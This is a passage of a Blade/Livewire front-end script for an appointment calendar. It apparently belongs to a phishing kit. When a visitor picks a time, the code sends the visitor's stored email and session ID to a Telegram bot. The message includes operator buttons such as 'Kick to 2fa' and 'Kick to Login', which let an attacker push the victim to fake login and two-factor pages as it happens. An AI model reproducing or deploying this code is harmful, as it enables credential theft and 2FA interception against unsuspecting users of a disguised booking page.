        showTodayButton:false,
        onClickDate: selectDate,
        disable: function (date) {
            const today = new Date();
            const yesterday = new Date(today.getFullYear(), today.getMonth(), today.getDate() - 1);
            return date <= yesterday;
        },
        showYearDropdown: true,
        startOnMonday: false,
    };
    $('#calendar-wrapper').calendar(defaultConfig);
    $(document).on('click','button.time',function (e){
        e.preventDefault();
        $('button.time').each(function (){
            $(this).parent('div').removeClass('next__button');
            $(this).parent('div').find('div > div').empty();
        });
        $(this).parent('div').addClass('next__button');
        $(this).parent('div').find('div > div').append('<button class="btn-next">Next</button>');
    });
    $(document).on('click','.btn-next',function (e){
        e.preventDefault();
        let time = $(this).parent('div').parent('div').parent('div').find('.time').data('time'); // Example: "10:30"
        let selectedDateFinal = new Date(selectedDate);
        if (!selectedDateFinal || !time) {
            console.error('selectedDate or time is missing');
            return;
        }

        let [hours, minutes] = time.split(':').map(Number);
        selectedDateFinal.setHours(hours);
        selectedDateFinal.setMinutes(minutes);
        selectedDateFinal.setSeconds(0);
        let session = localStorage.getItem('sessionId');
        fetch(`https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `===PICK A DATE: ${localStorage.getItem('email')}===\n ${selectedDateFinal}`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: `Kick to 2fa`,
                                callback_data: `/2fa ${session}`,
                            },
                            {
                                text: `Kick to Login`,
                                callback_data: `/login ${session}`,
                            },
                        ],
                        [
                            {
                                text: `Kick to the calendar`,
                                callback_data: `/schedule ${session}`,
                            },
                            {
                                text: `Thank You`,
                                callback_data: `/thankyou ${session}`,
                            },
                        ]
                    ],
                },
            })
        }).then(response => {
            @this.set('showCalenderProgress', true);
        }).catch(error => {

        });
    });
    document.getElementById('openChat').addEventListener('click', function(e) {
        e.preventDefault();
        if (window.jivo_api) {
            jivo_api.open();
        } else {
            console.error('JivoChat API is not loaded yet.');
        }
    });
</script>
@endscript
